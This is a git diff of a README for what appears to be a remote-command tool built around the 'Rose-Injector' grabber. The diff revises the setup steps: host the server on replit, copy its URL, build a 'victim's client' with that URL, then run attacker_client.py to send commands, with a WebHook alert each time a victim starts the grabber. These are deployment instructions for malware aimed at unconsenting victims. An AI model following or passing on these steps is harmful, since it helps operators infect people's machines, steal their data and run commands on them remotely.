@@ -84,14 +84,15 @@ Once a victim's client receives a command, it executes it and send a WebHook of 
 
 ### <a id="setup"></a> ⚙️ Setup
 
-* First, build a victim's client with [Rose-Injector](https://github.com/DamagingRose/Rose-Injector)
-* Create a new [repl](https://replit.com/~) and use Python as principal language
+* First, create a new [repl](https://replit.com/~) and use Python as principal language
 * Download this repository as a zip and upload all the file to the repl
 * Go back to your repl and click on `shell` in the top right corner
 * Enter `pip install -r requirements.txt`
 * Click on the `Run` green button at the top of the page 
 * Copy the URL
+* Build a victim's client with [Rose-Injector](https://github.com/DamagingRose/Rose-Injector) using the URL you just copied
 * Start `attacker_client.py` then paste the server URL
+* Whenever a victim starts the grabber, a WebHook will be sent to inform you!
 * You're now ready to execute command!
 
 ## <a id="preview"></a> 📷 〢 Preview
